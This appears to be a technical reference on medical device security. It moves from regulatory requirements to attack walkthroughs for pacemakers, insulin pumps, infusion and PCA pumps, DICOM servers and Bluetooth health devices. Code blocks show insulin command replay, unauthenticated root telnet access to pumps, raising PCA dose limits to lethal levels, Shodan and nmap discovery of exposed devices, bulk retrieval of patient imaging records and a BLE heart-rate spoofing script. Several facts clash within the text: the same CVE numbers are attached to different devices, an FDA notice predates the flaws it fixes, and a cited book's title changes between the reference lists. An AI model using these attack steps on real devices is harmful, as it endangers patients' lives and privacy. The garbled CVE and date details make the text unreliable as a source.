# Medical Device Security

## 1. Regulatory Landscape

### FDA Premarket Guidance

The FDA's guidance *Content of Premarket Submissions for Management of Cybersecurity Risks in Medical Devices* (2023) establishes cybersecurity requirements for medical device approval:

**Tier 1 (Higher Cybersecurity Risk)**: Devices that can directly affect patient safety through cybersecurity vulnerabilities. Includes:
- Implantable devices (pacemakers, ICDs, insulin pumps)
- Devices with network connectivity (hospital network, cloud, mobile)
- Devices that control life-sustaining therapy

**Tier 2 (Standard Cybersecurity Risk)**: Devices that do not directly affect patient safety through cybersecurity vulnerabilities.

**Premarket requirements (both tiers)**:
1. Cybersecurity risk analysis (threat modeling)
2. Secure design (least functionality, defense in depth)
3. secure architecture diagram
4. Software Bill of Materials (SBOM)
5. Vulnerability disclosure program
6. Plan for postmarket patching

**Additional requirements for Tier 1**:
- Multifactor authentication for remote access
- Hardware-based security (secure boot, hardware root of trust)
- Cryptographic integrity verification for software updates
- Anomaly detection capabilities

**Post-market guidance** (FDA, 2016, updated 2023): Manufacturers must:
- Monitor for cybersecurity vulnerabilities
- Assess risk using CVSS and exploitability metrics
- Fix vulnerabilities within defined timeframes
- Report to FDA if there is a reasonable likelihood of serious injury or death

### IEC 62304

IEC 62304 (*Medical device software — Software life cycle processes*) is the international standard for medical device software development:

- **Software Safety Classification**:
  - Class A: No injury or damage to health possible
  - Class B: Non-serious injury possible
  - Class C: Death or serious injury possible

- **Requirements by class**:
  - Class A: Basic development process
  - Class B: Documented architecture, unit testing
  - Class C: Formal design review, code review, static analysis, integration testing, system testing

- **Software maintenance**: Requires regression testing for patches, impact analysis for changes

### EU MDR (Medical Device Regulation)

The EU Medical Device Regulation (MDR 2017/745) replaces the Medical Devices Directive (MDD). Key cybersecurity requirements:
- Annex I, Section 17.2: Devices must be designed to minimize cybersecurity risks
- UDI (Unique Device Identification): Required for traceability
- Notified Body review: Cybersecurity is assessed during conformity assessment
- Post-market surveillance: Continuous monitoring for cybersecurity vulnerabilities

### IEC 62443 (Industrial Cybersecurity)

Applied to hospital network-connected medical devices:
- Security Level (SL) assessment based on device criticality
- Zone and conduit model for network segmentation
- Security requirements by SL (SL 1 through SL 4)

## 2. Pacemaker and ICD Vulnerabilities

### Medtronic Pacemaker Vulnerabilities

**CVE-2018-14781 / CVE-2018-14782**: Medtronic MyCareLink and CareLink 2090 programmers communicated with implantable cardiac devices without authentication or encryption.

**Attack vector**: The programmer's RF communication with the pacemaker used a proprietary protocol (Medtronic Conexus) that:
1. Did not authenticate the programmer
2. Did not encrypt RF communication
3. Did not verify command integrity
4. Operated at 175 kHz (short range, ~3 meters)

**Impact**: An attacker within RF range could:
- Read patient data (heart rhythm history, device settings)
- Modify pacing parameters (lower rate limit, pacing mode)
- Deplete the battery by commanding continuous RF transmission
- Potentially induce inappropriate shocks in ICDs

**FDA Safety Communication (2017-09-01)**: "The FDA has approved a firmware update that is intended to address these cybersecurity vulnerabilities."

**Firmware update process**:
1. Patient visits clinic
2. CareLink programmer is updated (software + encryption keys)
3. Programmer sends firmware update to pacemaker via RF
4. Pacemaker verifies firmware signature and applies update

**Key lesson**: The firmware update required physical proximity (RF range), but it was still a risk because:
- An attacker in a waiting room could be within range
- The update process itself took 3-5 minutes, during which pacing was suspended (safety risk)
- Approximately 2% of pacemakers experienced issues during the update

### Abbott/St. Jude Pacemaker Vulnerabilities

**CVE-2017-12712 / CVE-2017-14006**: St. Jude Medical (now Abbott) pacemakers had multiple vulnerabilities:

1. **RF communication without authentication**: The pacemaker accepted commands from any programmer in RF range without verifying the programmer's identity.

2. **No RF encryption**: All communication between the programmer and pacemaker was unencrypted. RF sniffer could capture patient data.

3. **Home monitoring system**: The Merlin@home transmitter connected to the pacemaker via RF and then transmitted data to the St. Jude Merlin.net cloud via cellular/WiFi. The home monitoring system was also exploitable.

4. **Crash mode**: Certain malformed RF commands could cause the pacemaker to enter a "crash mode" where it reverts to basic pacing (VOO mode at 67 BPM). This is a safety fallback, but it disables therapeutic features.

**Exploitation timeline**:
- 2016: Muddy Waters reports St. Jude pacemaker vulnerabilities (short seller report, later confirmed)
- 2017: FDA issues safety communication; St. Jude releases firmware update
- 2017: FDA confirms vulnerabilities and requires Abbott to implement encryption and authentication

### Pacemaker Programmer Security

The programmer is the critical attack surface for pacemakers:

```python
# Conceptual pacemaker programmer attack
# Step 1: Build or obtain a compatible RF interface
# - 175 kHz transmitter (Medtronic Conexus protocol)
# - Or 402 MHz (MICS band) for some models
# - Custom antenna design (loop antenna, tuned to 175 kHz)

# Step 2: Reverse engineer the RF protocol
# - Capture communication between legitimate programmer and pacemaker
# - Identify command structure, CRC calculation, initiation sequence
# - Medtronic Conexus uses proprietary encoding at 175 kHz

# Step 3: Craft and send commands
# - Read device: Serial number, model, firmware version, programmed parameters
# - Modify parameters: Pacing rate, sensitivity, output amplitude
# - Trigger functions: Battery test, lead impedance measurement

# After firmware update (authentication enabled):
# - Programmer must present authentication token
# - RF communication encrypted with AES-128
# - Requires programmer to have valid keys (loaded during programmer software update)
# - But: programmer authentication tokens are stored on the programmer, which may be physically accessible
```

**Programmer attack surface**:
- **Physical access**: Programmers in hospitals may be left unattended. An attacker could install malware on the programmer.
- **Network access**: Programmers connect to hospital networks. If the network is compromised, the programmer can be attacked.
- **Supply chain**: Programmer software updates could be maliciously modified.
- **USB ports**: Some programmers have USB ports for data export. Malicious USB devices could compromise the programmer.

### ICD (Implantable Cardioverter Defibrillator) Vulnerabilities

ICDs are pacemakers with additional defibrillation capability. The defibrillation circuit uses high-voltage capacitors (500-800V) to deliver shocks. Security concerns specific to ICDs:

- **Inappropriate shock**: An attacker could command an ICD to deliver an unnecessary high-voltage shock (up to 41 joules). This is painful, psychologically traumatic, and potentially dangerous.
- **Shock disabled**: An attacker could disable the defibrillation function, leaving the patient without life-saving therapy for ventricular fibrillation.
- **VT/VF detection manipulation**: Modifying detection thresholds to prevent appropriate shock delivery.

## 3. Insulin Pump Attacks

### Medtronic MiniMed 508/Paradigm Vulnerabilities

**CVE-2018-14781**: The Medtronic MiniMed 508 and Paradigm insulin pumps communicated with their remote controls over an unencrypted RF link at 916 MHz.

**Attack methodology** (demonstrated by Rios & Rad, 2016; later by various researchers):

```bash
# Equipment needed:
# - 916 MHz RF transceiver (e.g., CC1110-based or HackRF)
# - Custom antenna tuned to 916 MHz
# - Software: GNU Radio + custom OOK demodulator

# Step 1: Sniff RF communication
# The pump and remote communicate using OOK (On-Off Keying) at 916 MHz
# No encryption or authentication is used

# Step 2: Capture remote control commands
# - Bolus delivery command (deliver X units of insulin)
# - Basal rate change command
# - Suspend command (stop all insulin delivery)

# Step 3: Replay commands
# Replay the captured bolus command to deliver insulin without user consent
# This can cause hypoglycemia (dangerously low blood sugar)

# Step 4: Modify commands
# Change the bolus amount in the captured command
# Send a "suspend" command to stop insulin delivery, causing hyperglycemia

# Affected models:
# - Medtronic MiniMed 508
# - Medtronic Paradigm 512, 522, 712, 722
# - Over 400,000 devices recalled (FDA, June 2019)
```

### Omnipod Insulin Pump (Insulet)

**CVE-2018-10534 et al.**: The Omnipod insulin pump uses a custom RF protocol at 916 MHz with some encryption, but researchers found vulnerabilities:

```python
# Omnipod RF protocol analysis
# The pod and PDM (Personal Diabetes Manager) communicate at 916 MHz
# RF is encrypted using a key derived from the pod address (4 bytes)
# The pod address is sent in the clear (part of the message header)

# Attack: Capture any message from the pod/PDM
# Extract the pod address from the message header
# Derive the encryption key from the pod address
# The key derivation is weak: key = custom_hash(pod_address)
# Once the key is known, all past and future messages can be decrypted/encrypted

# Commands that can be sent:
# 0x1B: Bolus delivery
# 0x1E: Set basal rate
# 0x1A: Suspend
# 0x1C: Cancel bolus
# 0x0E: Set temporary basal rate
```

### Medtronic 670G / 770G Vulnerabilities

**CVE-2019-6538 / CVE-2019-6540**: The Medtronic 670G/770G insulin pump system had vulnerabilities in the CareLink USB dongle and Bluetooth communication:

1. **CareLink USB dongle**: The USB dongle used an unencrypted protocol to communicate with the pump. An attacker within RF range could:
   - Capture pump-patient communication
   - Inject bolus commands
   - Modify basal rates

2. **Bluetooth Low Energy**: The 770G added Bluetooth connectivity. The BLE pairing used Just Works mode (no authentication). An attacker could:
   - Pair with the pump without consent
   - Send commands via the paired connection
   - Eavesdrop on pump data

### Insulin Dose Manipulation

Insulin dosing attacks have specific physiological effects:

| Attack | Insulin Effect | Patient Impact |
|--------|---------------|----------------|
| Unauthorized bolus (10-50U) | Severe hypoglycemia | Seizure, coma, death |
| Basal rate increase | Gradual hypoglycemia | Unconsciousness, confusion |
| Suspend all delivery | Gradual hyperglycemia | Diabetic ketoacidosis, coma |
| Modify carb ratio | Insulin miscalculation | Hypo/hyperglycemia |
| Bolus cancel | Under-insulination | Hyperglycemia |

## 4. Drug Delivery System Manipulation

### Infusion Pump Vulnerabilities

**Hospira Plum A+ Infusion Pump (CVE-2015-3455 — "JekyllBot:5")**:

```bash
# The Hospira Plum A+ runs Linux on an Arm processor
# It has Ethernet and serial ports for hospital network connectivity

# Step 1: Network access
# The pump runs telnetd on port 23 with default credentials
telnet 192.168.1.100
# Login: root / [no password]

# Step 2: Modify drug library
# Drug libraries define concentration, dose limits, and flow rates
# Located in /drv/lib/druglib/current.db
# An attacker could:
# - Change morphine concentration from 1mg/mL to 10mg/mL
# - Modify dose limits (e.g., increase max infusion rate for vasoactives)
# - Remove hard and soft limits for dangerous drugs

# Step 3: Modify pump parameters via RPC
# The pump exposes an RPC interface on port 5000
# Commands include:
# - Start/stop infusion
# - Change flow rate
# - Change drug selection
# - Silence alarms

# CVE-2015-3455 specifics:
# - Telnet root access with no password
# - No firmware signature verification
# - Drug library updates over FTP with no authentication
# - Floppy disk (!!!) for drug library updates (could be loaded with malware)
```

**BD (Becton Dickinson) Alaris Infusion Pumps (CVE-2019-6547, CVE-2019-6548)**:

- **CVE-2019-6547**: Integer overflow in the wireless comms module enabling stack-based buffer overflow
- **CVE-2019-6548**: Improper authentication in the wireless comms module allowing unauthorized configuration changes
- Over 1,000 firmware vulnerabilities identified across the Alaris system (Rapid7, 2019)

### PCA (Patient-Controlled Analgesia) Pump Attacks

PCA pumps allow patients to self-administer pain medication within safety limits:

```bash
# PCA pump attack scenario:
# 1. Gain network access to the pump (hospital network)
# 2. Modify the drug library parameters:
#    - Increase the maximum bolus dose (e.g., morphine from 2mg to 20mg)
#    - Decrease the lockout interval (e.g., from 10 minutes to 30 seconds)
#    - Remove the 4-hour dose limit
# 3. The patient can now self-administer lethal doses

# Vulnerable PCA pumps identified:
# - Baxter Sigma Spectrum (multiple CVEs)
# - BD Alaris (CVE-2019-6547, CVE-2019-6548)
# - Hospira Plum A+ (CVE-2015-3455)
# - B. Braun Infusomat (CVE-2019-6540)
```

## 5. Hospital Device Network Security

### Network Architecture Issues

Hospital networks often have poor segmentation between medical devices and general IT:

```
[Internet] → [Hospital Firewall] → [Hospital LAN]
                                      ├── [General IT] (workstations, printers)
                                      ├── [Medical Devices] (infusion pumps, monitors)
                                      │     ├── [Patient monitoring] (no segmentation)
                                      │     ├── [Infusion pumps] (no segmentation)
                                      │     └── [Imaging systems] (no segmentation)
                                      └── [Guest WiFi] (may have access to medical VLAN)
```

**Common issues**:
1. **Flat networks**: Medical devices on the same VLAN as workstations
2. **Shared credentials**: All infusion pumps use the same SNMP community string
3. **Default passwords**: Many devices ship with admin:admin
4. **Legacy protocols**: DICOM, HL7 v2 (unencrypted), POP3, FTP
5. **No network monitoring**: IDS/IPS not deployed on medical VLANs
6. **Internet exposure**: Medical devices with public IP addresses (Shodan)

```bash
# Shodan search for exposed medical devices
shodan search "DICOM" port:104
shodan search "meddevice" port:23
shodan search "infusion pump" port:80
shodan search "CareLink" port:443
shodan search "HL7" port:2575

# ZoomEye search
zoomeye search "app infusion+pump"
```

### Medical Device Network Discovery

```bash
# Network scanning for medical devices
# Use careful, slow scanning to avoid disrupting devices
nmap -sS -p 80,443,23,161,104,2575,5000,8080 --open 10.0.0.0/24

# DICOM port (104) - imaging systems
nmap -sV -p 104 --script dicom-ping 10.0.0.0/24

# SNMP - many medical devices respond to SNMP
nmap -sU -p 161 --script snmp-info 10.0.0.0/24

# HL7v2 (port 2575) - health information exchange
nmap -sV -p 2575 10.0.0.0/24

# Identify specific device types
nmap -sV -p 80 --script http-title 10.0.0.0/24 | grep -i "infusion\|pump\|monitor\|ventilator"

# Passive network monitoring
# Capture and analyze medical device traffic
tcpdump -i eth0 -w medical_traffic.pcap "port 104 or port 2575 or port 5000 or port 8080"

# Medical device MAC address OUI lookup
# Common manufacturers:
# 00:1E:C0 - GE Healthcare
# 00:10:AF - Philips
# 00:80:49 - Siemens
# 00:50:C2:xx:xx - Johnson & Johnson (Codian)
# AC:1F:xx - BD
```

## 6. DICOM Protocol Vulnerabilities

### DICOM Overview

DICOM (Digital Imaging and Communications in Medicine) is the standard for medical imaging. It operates on port 104 and handles:
- Image storage (CT, MRI, X-ray, ultrasound)
- Patient demographics (name, DOB, SSN)
- Modality worklists (scheduled procedures)

**DICOM security issues**:
1. **No mandatory encryption**: Most DICOM implementations use plaintext TCP connections
2. **No mandatory authentication**: Many DICOM nodes accept associations from any client
3. **Patient data exposure**: DICOM images contain Protected Health Information (PHI) in headers
4. **Large attack surface**: DICOM has 130+ message service elements, many with historical vulnerabilities

```bash
# DICOM node enumeration with nmap
nmap -p 104 --script dicom-ping <target>

# DICOM node interaction with dcmtk
# Install DCMTK
apt install dcmtk

# Echo (verify DICOM node)
echoscu <target> 104

# Query patient information (C-FIND)
findscu -P -k "PatientName=*" <target> 104

# Query studies
findscu -S -k "StudyDate=20200101-20241231" -k "PatientID=*" <target> 104

# Retrieve all studies (C-MOVE)
movescu -S -k "StudyInstanceUID=*" --move <our_aetitle> <target> 104

# Upload a DICOM object (C-STORE)
storescu <target> 104 image.dcm
```

### DICOM Exploitation

```python
# DICOM fuzzing with pynetdicom
from pynetdicom import AE, VerificationPresentationContexts

ae = AE()
ae.add_requested_context('1.2.840.10008.1.1')  # Verification SOP Class

# Connect to DICOM node
assoc = ae.associate('192.168.1.100', 104)
if assoc.is_established:
    # Send verification request
    status = assoc.send_c_echo()
    print(f"Association established: {status}")
    
    # Query all patients
    dataset = Dataset()
    dataset.PatientName = ''
    dataset.PatientID = ''
    
    # Fuzz: Send malformed DIMSE messages
    # Buffer overflow in DICOM tag processing
    # Integer overflow in length fields
    # SQL injection in DICOM QIDO-RS
    assoc.release()
```

**DICOM vulnerabilities**:
- **CVE-2019-19478**: DCMTK buffer overflow in DcmSCP (DICOM Service Class Provider)
- **CVE-2020-19479**: DCMTK null pointer dereference in DcmSCP
- **DICOM pixel data injection**: Malicious CT/MRI images with embedded JavaScript executed when viewed in PACS web viewers
- **DICOM QIDO-RS SQL injection**: RESTful DICOM queries with SQL injection in query parameters

## 7. Bluetooth Telemetry Vulnerabilities

### Bluetooth Medical Device Protocols

Many medical devices use Bluetooth for telemetry (transmitting patient data to a monitor, phone, or hub):

- **Bluetooth Health Device Profile (HDP)**: Standardized profile for medical devices
- **IEEE 11073 20601**: Medical Device Communication protocol over Bluetooth
- **Proprietary BLE protocols**: Most modern devices use custom GATT profiles

### BLE Medical Device Attacks

```python
# BLE medical device enumeration
import bleak

async def enumerate_medical_device(address):
    async with bleak.BleakClient(address) as client:
        # Enumerate all services
        for service in client.services:
            print(f"Service: {service.uuid}")
            
            # Known medical device UUIDs:
            # 0x180F - Battery Service (common)
            # 0x180A - Device Information
            # 0x181C - User Data Service
            # 0x181D - Weight Scale Service
            # 0x181A - Environmental Sensing (some CGMs)
            # 0x1808 - Glucose Service
            # 0x1809 - Health Thermometer
            # 0x1810 - Blood Pressure Service
            # 0x180D - Heart Rate Service
            # 0x1814 - Continuous Glucose Monitor (CGMS)
            # 0x180B - Body Composition
            
            # Custom UUIDs (device-specific):
            # Medtronic: starts with 0000a7xx-...
            # Dexcom: starts with 005axxxx-...
            # Abbott: starts with 00f7xxxx-...
            
            for char in service.characteristics:
                print(f"  Characteristic: {char.uuid}")
                print(f"  Properties: {char.properties}")
                
                if 'read' in char.properties:
                    try:
                        value = await client.read_gatt_char(char.uuid)
                        print(f"  Value: {value.hex()} ({value})")
                    except:
                        pass
                        
                if 'write' in char.properties and 'read' not in char.properties:
                    print(f"  [!] Write-only characteristic: {char.uuid}")
                    print(f"  [!] This may control device behavior")
```

### Continuous Glucose Monitor (CGM) Attacks

CGMs (Dexcom G6, Abbott Freestyle Libre, Medtronic Guardian) transmit glucose data via Bluetooth:

```python
# Dexcom G6 BLE protocol analysis
# The transmitter broadcasts advertisements with:
# - Transmitter ID (2 bytes, last 2 digits of serial)
# - Transmitter status byte
# - Authentication byte

# Attack scenario: CGM data spoofing
# 1. Capture CGM transmitter advertisements
# 2. Clone the transmitter advertisement
# 3. Modify glucose readings (e.g., show normal glucose when actually high/low)
# 4. The receiver (phone, pump) acts on the falsified data
# 5. If the CGM is connected to a closed-loop insulin pump, this can cause:
#    - Excessive insulin delivery (if CGM shows falsely high glucose)
#    - Insulin suspension (if CGM shows falsely low glucose)

# Dexcom G6 specific vulnerabilities:
# - BLE pairing uses Just Works (no MITM protection)
# - Transmitter ID can be observed in advertisements
# - After pairing, the encryption key can be derived from the transmitter ID
# - Some older firmware versions allowed unauthenticated GATT writes
```

### Heart Rate Monitor BLE Attacks

```python
# Heart Rate Service (UUID 0x180D)
# Characteristics:
# - Heart Rate Measurement (0x2A37): Notify
# - Body Sensor Location (0x2A38): Read
# - Heart Rate Control Point (0x2A39): Write

# Attack: Send falsified heart rate data
import bleak
import struct

async def spoof_heart_rate(address, target_hr=180):
    async with bleak.BleakClient(address) as client:
        # Write to Heart Rate Control Point
        # Start/stop commands
        await client.write_gatt_char(
            "00002a39-0000-1000-8000-00805f9b34fb",
            b"\x01"  # Start measurement
        )
        
        # Read current heart rate
        hr_data = await client.read_gatt_char(
            "00002a37-0000-1000-8000-00805f9b34fb"
        )
        print(f"Current HR: {struct.unpack('<H', hr_data[1:3])[0]}")
        
        # If the device accepts writes to HR measurement:
        # Craft a false HR notification
        # Heart Rate Measurement format:
        # Byte 0: Flags (0x00 = HR as uint8, no sensor contact)
        # Byte 1: Heart Rate (8-bit)
        fake_hr = struct.pack('BB', 0x00, target_hr)
        await client.write_gatt_char(
            "00002a37-0000-1000-8000-00805f9b34fb",
            fake_hr
        )
```

## 8. MRI Safety Attacks

### MRI Safety Concerns

MRI machines generate extremely strong magnetic fields (1.5T, 3T, or 7T). Cybersecurity attacks on MRI safety systems could have physical consequences:

- **Quench system**: The superconducting magnet can be deliberately quenched (emergency shutdown) by activating the quench button. This boils off the helium and rapidly kills the magnetic field. A cybersecurity attack that triggers a quench could:
  - Cost $50,000-$200,000 in helium loss and magnet re-energization
  - Cause patient harm if ferromagnetic objects in the bore become projectiles when the field collapses
  
- **RF energy**: The RF transmit coil (body coil) can deliver up to 30 kW of RF energy. Misconfiguring the RF pulse sequence could cause tissue heating (especially with metallic implants).

- **Gradient coils**: The gradient amplifiers can produce rapidly switching magnetic fields. Incorrect gradient parameters could cause peripheral nerve stimulation or acoustic injury.

```bash
# MRI workstation security
# GE, Siemens, and Philips MRI workstations often run Windows or Linux
# Common vulnerabilities:
# - Unpatched OS (Windows XP, Windows 7)
# - Open SMB, RDP, and DICOM ports
# - Default credentials (service:service, admin:admin)
# - No network segmentation from hospital IT

# Shodan queries for exposed MRI workstations
shodan search "DICOM" os:Windows port:104
shodan search "GE Healthcare" port:80,443
shodan search "Siemens Healthcare" port:80,443
```

## 9. Regulatory Response and Future Direction

### FDA Premarket Guidance Evolution

| Year | Guidance | Key Requirements |
|------|----------|-----------------|
| 2014 | Cybersecurity guidance (draft) | Risk-based approach |
| 2016 | Postmarket management | Vulnerability disclosure, risk assessment |
| 2018 | Premarket cybersecurity (final) | SBOM, threat modeling, design security |
| 2023 | Updated premarket guidance | SBOM, multifactor auth, secure boot for Tier 1 |

### International Regulatory Landscape

| Region | Regulation | Status |
|--------|-----------|--------|
| USA | FDA Premarket Guidance | Final (2023) |
| USA | PATCH Act | Proposed (2022) |
| EU | MDR 2017/745 | In force |
| EU | Cyber Resilience Act | Proposed (2022) |
| UK | PDTF (Post-market) | Guidance (2019) |
| Japan | PMDA Guidelines | In force (2020) |
| Australia | TGA Medical Device Cybersecurity | Guidance (2023) |

### Emerging Standards

- **IEC 81001-5-1**: Security lifecycle requirements for health software (published 2021)
- **AAMI SW96**: Standard for security risk management in medical devices
- **ISO 14971**: Risk management for medical devices (updated 2019 to include cybersecurity)
- **IEC 62443-4-1/4-2**: Security lifecycle and component requirements for Industrial Automation

## 10. References

- FDA Premarket Cybersecurity Guidance (2023): fda.gov/regulatory-information
- IEC 62304:2006+A1:2015 — Medical device software life cycle processes
- Rios & Rad: "Insulin Pumps and PACEMAKERS: When Software Bugs Are Life-Threatening" (Black Hat 2016)
- CVE-2018-14781, CVE-2018-14782 — Medtronic Conexus RF
- CVE-2017-12712 — St. Jude Pacemaker
- CVE-2019-6538, CVE-2019-6540 — Medtronic 670G/770G Insulin Pump
- CVE-2015-3455 — Hospira Plum A+ (JekyllBot:5)
- *Hackable: The Art of Exploiting Medical Devices* — Billy Rios
- *Practical Medical Device Security* — Collin Mulliner
- *Medical Device Cybersecurity* — FUHAO (2020)
- ICS-CERT Medical Device Advisories: ics-cert.us-cert.gov
- DHS CISA Medical Device Advisories: cisa.gov/known-exploited-vulnerabilities

## References

1. FDA. Content of Premarket Submissions for Management of Cybersecurity Risks in Medical Devices (2023). https://www.fda.gov/regulatory-information/
2. FDA. Postmarket Management of Cybersecurity in Medical Devices (2016, updated 2023). https://www.fda.gov/regulatory-information/
3. IEC 62304:2006+A1:2015 — Medical Device Software — Software Life Cycle Processes. International Electrotechnical Commission.
4. IEC 81001-5-1:2021 — Security Lifecycle Requirements for Health Software. International Electrotechnical Commission.
5. AAMI SW96: Standard for Security Risk Management in Medical Devices. Association for the Advancement of Medical Instrumentation.
6. ISO 14971:2019 — Medical Devices — Application of Risk Management. International Organization for Standardization.
7. IEC 62443-4-1/4-2: Security Lifecycle and Component Requirements for Industrial Automation. International Electrotechnical Commission.
8. Rios, B. and Rad, D. "Insulin Pumps and Pacemakers: When Software Bugs Are Life-Threatening." Black Hat USA (2016).
9. CVE-2018-14781, CVE-2018-14782: Medtronic Conexus RF Protocol Vulnerabilities. NVD.
10. CVE-2017-12712: St. Jude Medical Pacemaker RF Communication Vulnerability. NVD.
11. CVE-2019-6538, CVE-2019-6540: Medtronic 670G/770G Insulin Pump Vulnerabilities. NVD.
12. CVE-2015-3455: Hospira Plum A+ Telnet Root Access (JekyllBot:5). NVD.
13. CVE-2019-6547, CVE-2019-6548: BD Alaris Infusion Pump Vulnerabilities. NVD.
14. *Hackable: The Art of Exploiting Medical Devices* — Billy Rios.
15. *Practical Medical Device Penetration Testing* — Collin Mulliner.
16. DHS CISA Medical Device Advisories. https://cisa.gov/known-exploited-vulnerabilities
17. EU MDR 2017/745: Medical Device Regulation. European Commission.
18. *The IoT Hacker's Handbook* by Aditya Gupta. Apress (2019).
19. *The Hardware Hacking Handbook* by Colin O'Flynn and Jasper van Woudenberg. No Starch Press (2022).
20. DEF CON IoT Village / Medical Device Village Presentations. https://iotvillage.org/
21. Rapid7. "Vulnerabilities in BD Alaris Gateway Workstation" (2019). https://www.rapid7.com/research/
22. NIST SP 800-183: Networks of Things. National Institute of Standards and Technology.
23. OWASP IoT Top 10. https://owasp.org/www-project-iot-top-10/
24. CVE-2019-19478: DCMTK DcmSCP Buffer Overflow. NVD.
25. CVE-2020-19479: DCMTK DcmSCP Null Pointer Dereference. NVD.
26. CVE-2018-10534: Omnipod Insulin Pump RF Protocol Vulnerabilities. NVD.